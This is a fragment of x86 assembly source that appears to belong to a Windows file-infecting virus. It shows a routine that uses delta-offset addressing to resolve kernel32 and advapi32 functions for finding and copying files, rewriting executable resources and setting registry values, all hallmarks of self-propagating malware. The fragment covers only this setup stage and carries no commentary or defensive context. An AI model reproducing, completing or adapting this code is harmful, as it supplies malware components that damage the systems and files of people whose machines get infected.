.code              

find_other_apis:
jmp fo_code

dll_base dd 0
advapi32N db "advapi32.dll",0
advapi32A dd 0

apis_name:
CreateFileF db "CreateFileA",0
CloseHandleF db "CloseHandle",0
WriteFileF db "WriteFile",0
ReadFileF db "ReadFile",0
BeginUpdateResourceF db "BeginUpdateResourceA",0
UpdateResourceF db "UpdateResourceA",0
EndUpdateResourceF db "EndUpdateResourceA",0
FindResourceF db "FindResourceA",0
GetFileSizeF db "GetFileSize",0
GlobalAllocF db "GlobalAlloc",0
SetFilePointerF db "SetFilePointer",0
GetVersionExF db "GetVersionExA",0
GetDateFormatF db "GetDateFormatA",0
SleepF db "Sleep",0
FindFirstFileF db "FindFirstFileA",0
FindNextFileF db "FindNextFileA",0
FindCloseF db "FindClose",0
GetLastError db "GetLastError",0
ExitProcessF db "ExitProcess",0
LoadLibraryF db "LoadLibraryA",0
FreeLibraryF db "FreeLibrary",0
GetEnvironmentVariableF db "ExpandEnvironmentStringsA",0
GetModuleFileNameF db "GetModuleFileNameA",0
CopyFileF db "CopyFileA",0
GetCurrentDirectoryF db "GetCurrentDirectoryA",0
SetCurrentDirectoryF db "SetCurrentDirectoryA",0
GetFileAttributesF db "GetFileAttributesA",0

dd 0ffh





apis_address:
ACreateFileF dd 0
ACloseHandleF dd 0
AWriteFileF dd 0
AReadFileF dd 0
ABeginUpdateResourceF dd 0
AUpdateResourceF dd 0
AEndUpdateResourceF dd 0
AFindResourceF dd 0
AGetFileSizeF dd 0
AGlobalAllocF dd 0
ASetFilePointerF dd 0
AGetVersionExF dd 0
AGetDateFormatF dd 0
ASleepF dd 0
AFindFirstFileF dd 0
AFindNextFileF dd 0
AFindCloseF dd 0
AGetLastErrorF dd 0
AExitProcessF dd 0
ALoadLibraryF dd 0
AFreeLibraryF dd 0

AGetEnvironmentVariableF dd 0
AGetModuleFileNameF dd 0
ACopyFileF dd 0
AGetCurrentDirectoryF dd 0
ASetCurrentDirectoryF dd 0
AGetFileAttributesF dd 0

dd 0ffh


advapi_api:
RegOpenKeyExF db "RegOpenKeyExA",0
RegQueryValueExF db "RegQueryValueExA",0
RegSetValueExF db "RegSetValueExA",0
RegCloseKeyF db "RegCloseKey",0
dd 0ffh

advapi_addresses:
ARegOpenKeyExF dd 0
ARegQueryValueExF dd 0
ARegSetValueExF dd 0
ARegCloseKeyF dd 0

dd 0ffh



fo_code:

mov esi,offset apis_name
mov edi,offset apis_address
add esi,ebp
add edi,ebp
push [ebp+offset kernel_base]
pop [ebp+offset dll_base]

call l00p_apis

mov eax,offset advapi32N
add eax,ebp
push eax
call [ebp+offset ALoadLibraryF]
or eax,eax
jz exit
mov [ebp+offset dll_base],eax
mov esi,offset advapi_api
mov edi,offset advapi_addresses
add esi,ebp
add edi,ebp
call l00p_apis







ret


l00p_apis:
mov eax,esi
push eax
push [ebp+offset dll_base]
call dword ptr[ebp+offset AGetProcAddressF]
or eax,eax
jz exit
mov dword ptr [edi],eax

l00p_small:
inc esi
cmp byte ptr[esi],0
jne l00p_small

next_api_name:
inc esi

add edi,4
cmp dword ptr [edi],0ffh
je finish_fo
jmp l00p_apis
finish_fo:

ret 

